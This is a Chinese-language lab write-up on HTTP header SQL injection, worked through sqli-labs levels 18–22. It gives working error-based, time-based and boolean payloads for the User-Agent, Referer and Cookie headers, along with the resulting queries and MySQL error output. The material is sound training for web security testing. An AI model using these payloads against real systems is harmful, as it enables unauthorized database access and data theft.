---
title: http头部注入
toc: true
description:
summary:
    本文主要介绍 http 头部注入类型，并通过 sqli-lib 18,19,20，21 分别来介绍 User-Agent
    注入，referer注入，cookie 注入
categories:
    - websec
    - sql injection
date: 2019-07-30 15:13:42
tags:
---

# http 头部注入简介

根据常见性依次有：User-Agent、cookie、X-Forwarded-For、Client-IP、Referer、Host 等。

[X-Forwarded-For 的一些理解](https://www.jianshu.com/p/792048d08ebc)

## HTTP 头部详解

User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）

Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）.

X-Forwarded-For：简称 XFF 头，它代表客户端，也就是 HTTP 的请求端真实的 IP,（通常一些网站的防注入功能会记录请求端真实 IP 地址并写入数据库 or 某文件[通过修改 XXF 头可以实现伪造 IP]）.

Clien-IP：同上，不做过多介绍.

Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的.

Host：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号

## 注入姿势

首先介绍，我认为测试 http -header 头部的正确姿势

首先注册该网站账号（这里注意一般注册时用户名和密码不要是一样的，要有区分度。），先用正确的账号密码测试，因为据我观测：在登录（不管账号密码正确与否）时，都会有 user-agent 与 referer（如果说的不对，还请大佬指教。），cookie 初次登录成功之后才会有（所以测试 cookie 是需要有一个账号密码的）当然，你要是测试 post 注入什么的就没有必要注册账号了。这里是指 http header 注入。

下面介绍两种注入姿势：

哪种姿势适合你，你就选择哪种。

1. 使用 hackbar 在 post 数据处，输入正确的用户名和密码，并打开 hackbar 中 user agent，通过查看 network 中的请求，复制自己的 useragent 标识，到 hackbar 的 useragent 处，
2. 使用 burp repeater 抓包，然后进行重放，值得一提的是，repeater 中的 render 渲染功能还行，可以直接渲染出页面。

注：本来用 hackbar 修改 referer 头，但是不管用，后来发现，hackbar 没有改掉 referer，一个 bug（可能是由于 chrome 某些改进的参数导致，注意当你感觉使用一个工具产生的结果与想的不一样的话，不妨试试别的工具。或者通过别的方式验证一下。），最后使用 burp suite 吧。（下面的回显报错可以在 burp repeater 的报文或 **render 渲染里面看到**，建议去 render 看，因为有一些字符报文中显示不出来）。我们不是大神，不可能遇到一个问题，没有完美的工具就自己写一个工具。每种工具都有它的优缺点，我们要善于利用它的优点，避免它的缺点。在 web 安全中有时干一件事情，需要用到几个工具，这是很正常的事情。

# user-agent 注入

**我猜测**：网站记录用户的 user-agent 存入数据库（**怎么存？当然是使用 insert 语句啦，这是我们要知道的。**），一方面是为了识别用户设备，另一方面，由于设备不同，可能会有不同的优化/处理吧。

下面熟悉的流程步骤又来了，现在就把 useragent 当成你 post 注入时的输入框，流程大致一样。

## 测试注入点

在 useragent 内容的后面测试单引号/双引号/单引号括号/双引号括号/单引号双括号/双引号双括号/ 等。
看页面变化及报错。

有的时候是直接报错语句，有的时候，返回 401 Unauthorzed，具体看情况。

我的测试 payload：

> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'

回显：

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '192.168.107.1', 'admin')' at line 1

注入点存在。

## 判断注入类型

根据报错：192.168.107.1', 'admin')，这里猜测该网站通过将 user agent 插入了数据库来验证身份（当然，目前据我所知就两种：一种是不存储，一种是 insert 插入，报错了，肯定就是 insert 存储了呗）
这里由于用户名与密码是一样的，不能区分，admin 是啥，不过，在本例中也没关系（但是，别的情况可能就有关系了。账号密码还是不要相同的好）
猜测大致 sql 查询语句：

```php
insert into tbl_name values($useragent,$ip,$useraname/$password);
```

即：insert 语句、三个字段、字段用单引号包裹

## 构造有效 payload

这里不是 select 就别用什么 order by 了，也就没有显示位一说了。

对于 insert 语句注入的话，一般就是盲注了，报错、布尔、时间三种。

注：由于设备的 User-Agent 太长了，下面我用 Mozilla/5.0 代替全部 User-Agent 内容，即：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36。这里想说 User-Agent 的原始数据不要改吧，万一判断长度什么的，改短了再出别的事情了（总之，看你自己了。）

### 测试报错注入

paylaod:

```php
Mozilla/5.0', (select 1 and extractvalue(1,concat(0x23,(select version())))),(select 1))#
```

当然，我一开始使用的注释是 -- ，但是不管用（php 给我把空格去掉了，我在 mysql 执行该 payload 生成的语句就可以），于是换成了 #

回显：XPATH syntax error: '#5.5.53'

测试成功，后面的步骤与方法你懂得。

学习了 mysql 注入天书对本节的注入流程后，我发现有另一种构造方式。

payload

```
'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1
```

实际执行的语句为：

```
INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`)
VALUES (''and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1', '192.168.107.1', 'admin')
```

此 payload 以不改变其他字段内容为出发点，利用 and 连接 布尔值，返回布尔值，而布尔值可以与 0 或 1 进行自动转换的特点构造而成。（注：空串可以自动转化为 0 以及布尔值 false）。

下面证实我的说法

```sql
mysql> insert into temp values(1 and 1 and 1,'me','pwd');
Query OK, 1 row affected (0.00 sec)

mysql> select * from temp;
+------+-------+----------+
| id   | uname | pass     |
+------+-------+----------+
|    1 | admin | pass     |
|    2 | user  | password |
|    3 | green | pwd      |
|    1 | me    | pwd      |
+------+-------+----------+
4 rows in set (0.00 sec)

mysql> insert into temp values(''and 1 and 1,'me','pwd');
Query OK, 1 row affected (0.00 sec)

mysql> select * from temp;
+------+-------+----------+
| id   | uname | pass     |
+------+-------+----------+
|    1 | admin | pass     |
|    2 | user  | password |
|    3 | green | pwd      |
|    0 | me    | pwd      |
|    1 | me    | pwd      |
+------+-------+----------+
5 rows in set (0.00 sec)
```

另一个 payload：

```php
'and updatexml(1,concat(0x7e,(select user()),0x7e),1),1,1)#
```

思想与上面有共同之处，就不再讲解。

小结：
构造 payload 两种思路

1. 只破坏（使用）该字段，闭合前单引号，使用 and 来与前面的单引号组成一个字段下 and 的运算数，同时再使用一个 and '1 来闭合该字段原来后单引号。
2. 闭合该字段，再后面自己构造一个字段用来注入

### 测试布尔盲注

Mozilla/5.0', (select 1),(select 1)) and 1=1# 报错。

报错原因：
之前我们可以用 and 1=1 或 and 1=2 测试布尔盲注的原因是 where 与 and 的连用。 'where id =1 and 1=2' 中的 and 的运算数分别为：id =1 与 1=2，二者均为布尔值。数据库遍历每条数据，查询出满足 id=1 且 1=2 的数据。

而现在是 insert into 语句，and 两侧要求为布尔值，而此时显然不满足，所以报 and 那里的错。这里我们知道在插入语句 insert 使用布尔盲注是不太好实现的。因为你没有办法通过改变你插入的 payload 来改变页面报错与否。

比如：Mozilla/5.0', ((select 1) and sleep(3)),(select((if(left(version(),1)>4,1,0)))))#
原本正常情况下，你使用 判断版本每个字符返回的真假来控制页面正常与否，而在 insert 语句中，该真假只是被插入到数据库中，你并看不到它，因此页面一直显示正常。

这里没有出错点使你的页面随着你的判断字符大小变化。当然，你也可以构造随着你的判断正误而报错与否的语句，要构造的话，就需要用到一些报错，所以不知道这算布尔盲注还是算报错盲注，照我来说，还是算布尔盲注，因为报错盲注是指通过报错把敏感信息直接显示出来。

下面给出一个 payload：

```php
Mozilla/5.0', (select 1),(select (if(left(version(),1)>5,1,0))=1 or pow(999,999)))#
```

利用了 double 溢出报错与 or 的短路特性

当然，实际渗透过程中，有正规的报错注入点，我们就不用测布尔盲注了。
我这里自己构造 payload 只是因为构造有效的 payload 让人快乐，haha

这里我遇到一个博文写的 User-agent 注入，使用正常的布尔盲注。要是数据库语句也是 insert into 的话，那就奇怪了。当然，咱也不知道 sql 语句是啥，给出链接仅供参考。

[SQL injection through User-Agent](https://medium.com/@frostnull/sql-injection-through-user-agent-44a1150f6888)

### 测试时间盲注

构造 payload:

```php
Mozilla/5.0', ((select 1) and sleep(3)),(select 1)) #
```

延时成功

下面给出后续时间盲注 payload 示例：

```php
Mozilla/5.0', (select 1),(select((if(left(version(),1)>5,1,sleep(3))))))#
```

# referer 注入

## 简介

> HTTP 来源地址（**referer**，或 **HTTP referer**）是 HTTP 表头的一个字段，用来**表示从哪儿链接到目前的网页**，采用的格式是 URL。换句话说，借着 HTTP 来源地址，目前的网页可以检查访客从哪里而来，这也常被用来对付伪造的跨网站请求。

## 检测注入点

这一步不进行了，因为都知道是 referer 注入了。

目前来看，检测注入点顺序：地址栏->搜索栏->登录栏->http 头部（User-Agent->referer->cookie）

## 检测注入类型

加个单引号，raw 中回显报错：

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '192.168.107.1')' at line 1

注：repeater 中的 raw 和 render 要对比着看，正如前面所说，raw 中有些字符不显示。

render 中查看，

![render](https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/less19_render.png)

说明存在注入，根据 render 的页面我们就可以更加清楚地判断后台 sql 查询语句。

于是我们知道 referer、ip 两个字段，并且它们分别用单引号包裹。这样我们可以沿用 user agent 的注入思路：只使用（破坏）该注入字段（即：referer ）或者闭合 referer，使用其后面的字段。

下面测试三种盲注。

### 测试报错注入

#### 检测版本

根据上面只使用（破坏）一个字段的思想，而且也只有一个字段让我们用，构造一下 paylaod

payload（加在 referer 后面）：

```php
',(extractvalue(1,concat(0x23,(select version()))))) #
```

回显：XPATH syntax error: '#5.5.53' 成功了，报错注入可行成功

### 测试延时注入

payload

```php
',(select 1 from (select sleep(20))a)) #
```

根据人对返回时间的感觉，当然，burp 的 repeater 可以看响应时间，在右下角，写着多少毫秒呢。延时注入成功。

### 测试布尔注入

布尔注入的情况与前面 insert user agent 一样。

# cookie 注入

## 简介

> cookie 就是浏览器储存在用户电脑上的一小段文本文件。cookie 是纯文本格式，不包含任何可执行的代码。一个 Web 页面或服务器告知浏览器按照一定规范来储存这些信息，并在随后的请求中将这些信息发送至服务器，Web 服务器就可以使用这些信息来识别不同的用户。大多数需要登录的网站在用户验证成功之后都会设置一个 cookie，只要这个 cookie 存在并可以，用户就可以自由浏览这个网站的任意页面。再次说明，cookie 只包含数据，就其本身而言并不有害。

cookie 注入

首先使用正确的用户名与密码登录，此时我们获得 cookie ：uname=admin

下面对 cookie 进行注入，与上面注入类似，下面给出 payload 示例：

```php
uname=admin'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#
```

cookie 注入需要注意一点：cookie 的格式：name=value，比如这里：cookie 就是 uname=后面一堆。

sqli-lab 第 21 关：我们查看 cookie 可以看到，明显是被编码了的，因此，我们猜测编码方式为 base 64，（为什么猜测是它呢？1. 常用 2. 经验），然后和 20 关相同，只是我们构造完 cookie 的 payload，用 base64 编码一下就好了。

sqli-lab 第 22 关：有了 21 关的基础，我们先解密抓包或在开发者工具找的 cookie，然后进行检测加一个单引号，不报错，换成双引号，报错如下：

> **Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"admin"" LIMIT 0,1' at line 1**

于是我们可以知道 cookie 由双引号包裹。其余的和 21 关一样。

# 总结回顾

1. 工具的缺点：hackbar 不能用 referer 头，burp suite repeater 的 raw 中不显示一些特定字符，需要同时参考 render。

2. chrome 推荐使用谷歌商店里那个，图标为黑色底色有一个白色 H 的 hackbar （Offered by: 0140454）可以修改 referer，挺好。
3. hackbar 有 burp 插件了，在 github 上可以找到，这样有完美了，可以只使用一种工具了：浏览器（hackbar 浏览器插件）或 burp+hackbar（burp 插件）来测试。其中 hackbar 浏览器插件的添加 header 时，可以直接输入名来搜索，然后选择就行。

参考资料：

> [浅谈 http 头注入(附案例)](https://zhuanlan.zhihu.com/p/27553821)
